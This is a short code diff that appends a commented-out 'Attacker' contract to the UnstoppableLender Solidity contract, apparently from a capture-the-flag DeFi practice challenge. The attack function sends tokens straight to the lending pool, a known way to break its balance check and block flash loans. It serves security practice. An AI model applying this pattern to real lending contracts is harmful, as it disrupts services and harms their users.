@@ -47,3 +47,20 @@ contract UnstoppableLender is ReentrancyGuard {
         require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
     }
 }
+
+// DO NO NEED THIS CONTRACT 
+
+// contract Attacker {
+
+//     address private immutable _poolAddress;
+//     address private immutable _tokenAddress;
+
+//     constructor(address tokenAddress, address poolAddress) {
+//         _poolAddress = poolAddress;
+//         _tokenAddress = tokenAddress;
+//     }
+
+//     function attack(uint256 amount) external {
+//         require(IERC20(_tokenAddress).transfer(_poolAddress, amount), "Transfer of tokens failed");
+//     }
+// }
